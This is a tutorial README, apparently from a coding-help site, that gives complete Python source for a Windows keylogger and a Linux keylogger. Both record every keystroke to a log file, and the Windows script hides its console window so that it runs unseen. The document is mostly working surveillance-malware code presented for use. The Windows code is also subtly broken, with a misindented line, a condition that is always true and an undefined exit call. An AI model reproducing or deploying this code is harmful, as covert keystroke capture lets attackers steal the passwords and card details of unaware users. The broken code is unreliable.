# Design a KeyLogger using Python


Keystroke logging, often referred to as keylogging or keyboard capturing, is the action of recording (logging) the keys struck on a keyboard, typically covertly, so that the person using the keyboard is unaware that their actions are being monitored.<br>

These are computer programs designed to work on the target computer’s software. Keyloggers are used in IT organizations to troubleshoot technical problems with computers and business networks. Families and business people use keyloggers legally to monitor network usage without their users’ direct knowledge. However, malicious individuals can use keyloggers on public computers to steal passwords or credit card information.<br>




## Keylogger for Windows

> Download some python libraries <br>
1. [pywin32](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32)
2. [pyhook](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyhook)

Following is the code to create keylogger in python <br>

```py
import win32api 
import win32console 
import win32gui 
import pythoncom, pyHook 
  
win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 
  
def OnKeyboardEvent(event): 
    if event.Ascii==5: 
        _exit(1) 
    if event.Ascii !=0 or 8: 
    #open output.txt to read current keystrokes 
        f = open('c:\output.txt', 'r+') 
        buffer = f.read() 
        f.close() 
    # open output.txt to write current + new keystrokes 
        f = open('c:\output.txt', 'w') 
        keylogs = chr(event.Ascii) 
        if event.Ascii == 13: 
        keylogs = '/n'
        buffer += keylogs 
        f.write(buffer) 
        f.close() 
# create a hook manager object 
hm = pyHook.HookManager() 
hm.KeyDown = OnKeyboardEvent 
# set the hook 
hm.HookKeyboard() 
# wait forever 
pythoncom.PumpMessages() 
```
<br>

> Save the file in C:\ as Keylogger.py and run the python script <br>


**Output:**<br>
> The keylogger will be started in the background and save all the data on the log file “c:\output.txt”. <br>





## Keylogger in Linux

**pyxhook** requires **python-xlib**. Install it if you don’t have it already.<br>

> sudo apt-get install python-xlib <br>

Download [pyxhook](https://github.com/JeffHoogland/pyxhook/blob/master/pyxhook.py) library <br>

```py
import os 
import pyxhook 
  
# This tells the keylogger where the log file will go. 
# You can set the file path as an environment variable ('pylogger_file'), or use the default ~/Desktop/file.log 
log_file = os.environ.get( 
    'pylogger_file', 
    os.path.expanduser('~/Desktop/file.log') 
) 
# Allow setting the cancel key from environment args, Default: ` 
cancel_key = ord( 
    os.environ.get( 
        'pylogger_cancel', 
        '`'
    )[0] 
) 
  
# Allow clearing the log file on start, if pylogger_clean is defined. 
if os.environ.get('pylogger_clean', None) is not None: 
    try: 
        os.remove(log_file) 
    except EnvironmentError: 
       # File does not exist, or no permissions. 
        pass
  
#creating key pressing event and saving it into log file 
def OnKeyPress(event): 
    with open(log_file, 'a') as f: 
        f.write('{}\n'.format(event.Key)) 
  
# create a hook manager object 
new_hook = pyxhook.HookManager() 
new_hook.KeyDown = OnKeyPress 
# set the hook 
new_hook.HookKeyboard() 
try: 
    new_hook.start()         # start the hook 
except KeyboardInterrupt: 
    # User cancelled from command line. 
    pass
except Exception as ex: 
    # Write exceptions to the log file, for analysis later. 
    msg = 'Error while catching events:\n  {}'.format(ex) 
    pyxhook.print_err(msg) 
    with open(log_file, 'a') as f: 
        f.write('\n{}'.format(msg)) 
```
<br>
Output: <br>

> The keylogger will be started in the background and save all the data on the file.log file “/home/username/Desktop”.<br>


Credit : Akash Sharan <br>

References :
* https://en.wikipedia.org/wiki/Keystroke_logging
* https://www.geeksforgeeks.org/design-a-keylogger-in-python/?ref=lbp
